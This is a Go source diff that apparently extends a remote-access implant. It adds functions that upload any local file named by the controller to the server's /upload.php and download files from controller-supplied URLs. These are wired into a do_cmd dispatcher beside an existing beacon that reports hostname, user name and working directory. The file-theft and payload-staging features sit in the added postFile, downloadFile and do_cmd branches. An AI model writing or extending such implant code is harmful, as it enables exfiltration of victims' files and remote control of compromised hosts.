@@ -3,10 +3,14 @@ package main
 import (
     "net/http"
     "net/url"
+    "io"
+    "path/filepath"
+    "path"
     "io/ioutil"
     "strconv"
     "encoding/json"
-    //"bytes"
+    "bytes"
+    "mime/multipart"
     "os"
     "fmt"
     "crypto/tls"
@@ -64,6 +68,81 @@ func ignore(err error){
     }
 }
 
+
+
+func postFile(filename string, targetUrl string) error {
+    bodyBuf := &bytes.Buffer{}
+    bodyWriter := multipart.NewWriter(bodyBuf)
+
+    // this step is very important
+    fileWriter, err := bodyWriter.CreateFormFile(filename, filename)
+    if err != nil {
+        fmt.Println("error writing to buffer")
+        return err
+    }
+
+    // open file handle
+    fh, err := os.Open(filename)
+    if err != nil {
+        fmt.Println("error opening file")
+        return err
+    }
+    defer fh.Close()
+
+    //iocopy
+    _, err = io.Copy(fileWriter, fh)
+    if err != nil {
+        return err
+    }
+
+    contentType := bodyWriter.FormDataContentType()
+    bodyWriter.Close()
+
+    resp, err := http.Post(targetUrl, contentType, bodyBuf)
+    if err != nil {
+        return err
+    }
+    defer resp.Body.Close()
+    resp_body, err := ioutil.ReadAll(resp.Body)
+    if err != nil {
+        return err
+    }
+    fmt.Println(resp.Status)
+    fmt.Println(string(resp_body))
+    return nil
+}
+
+func downloadFile(filepath string, url string) (err error) {
+
+  // Create the file
+  out, err := os.Create(filepath)
+  if err != nil  {
+    return err
+  }
+  defer out.Close()
+
+  // Get the data
+  resp, err := http.Get(url)
+  if err != nil {
+    return err
+  }
+  defer resp.Body.Close()
+
+  // Check server response
+  if resp.StatusCode != http.StatusOK {
+    return fmt.Errorf("bad status: %s", resp.Status)
+  }
+
+  // Writer the body to file
+  _, err = io.Copy(out, resp.Body)
+  if err != nil  {
+    return err
+  }
+
+  return nil
+}
+
+
 func get_beacon() url.Values {
     user, err := user.Current()
     ignore(err)
@@ -77,6 +156,18 @@ func get_beacon() url.Values {
     return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Name}, "cwd":{dir}}
 }
 
+func get_args(rec []interface{}) []interface {} {
+
+    //rec := nil
+    var j_inner []interface{}
+    json.Unmarshal([]byte(rec[1].(string)), &j_inner)
+    if j_inner != nil {
+        fmt.Printf("Unmarshalled (inner): %s\n", j_inner)
+        rec[1] = j_inner
+    }
+    return rec
+}
+
 func do_cmd(body []byte) {
     fmt.Println("in do_cmd")
     var j map[string]interface{}
@@ -86,24 +177,29 @@ func do_cmd(body []byte) {
     for cmd, record := range j {
         fmt.Printf("CMD:%s\nArgs:%s\n", cmd,record)
         if cmd == "set" {
-            if rec, ok := record.([]interface{}); ok {
-                var j_inner []interface{}
-                json.Unmarshal([]byte(rec[1].(string)), &j_inner)
-                if j_inner != nil {
-                    fmt.Printf("Unmarshalled (inner): %s\n", j_inner)
-                    rec[1] = j_inner
-                }
-               SETTINGS[rec[0]] = rec[1]
-               fmt.Printf("SETTINGS['%s']:%s  (%T)\n", rec[0],rec[1], rec[1])
-               /* 
-                for k, v := range rec {
-                    SETTINGS[k] = v
-                    fmt.Printf("SETTINGS[%s]:%s\n", k,v)
-                }
-                */
-            } else {
-                fmt.Printf("record is %T , not a map[string]interface{}: %v\n", record, record)
+            rec := get_args(record.([]interface{}))
+            if rec != nil {
+                SETTINGS[rec[0]] = rec[1]
+                fmt.Printf("SETTINGS['%s']:%s  (%T)\n", rec[0],rec[1], rec[1])
             }
+        } else if cmd == "download" {
+            //rec := get_args(record.([]interface{}))
+            u, _ := url.Parse(SETTINGS["url"].(string))
+            u.Path = "/upload.php"
+            fmt.Printf("Rec: %s\n", record)
+            postFile(record.([]interface{})[0].(string), u.String())
+        } else if cmd == "upload" {
+            fmt.Printf("Uploading\n")
+            file_url := record.([]interface{})[0].(string)
+            u, _ := url.Parse(file_url)
+            fmt.Printf("Path: %s", u.Path)
+            filename := path.Base(u.Path)
+            wd, _ := os.Getwd()
+            filename = filepath.Join(wd, filename)
+
+            //rec := get_args(record.([]interface{}))
+            fmt.Printf("Rec: %s\n", record)
+            downloadFile(filename, file_url)
         } else {
             fmt.Printf("CMD:%s no supported!", cmd)
         }
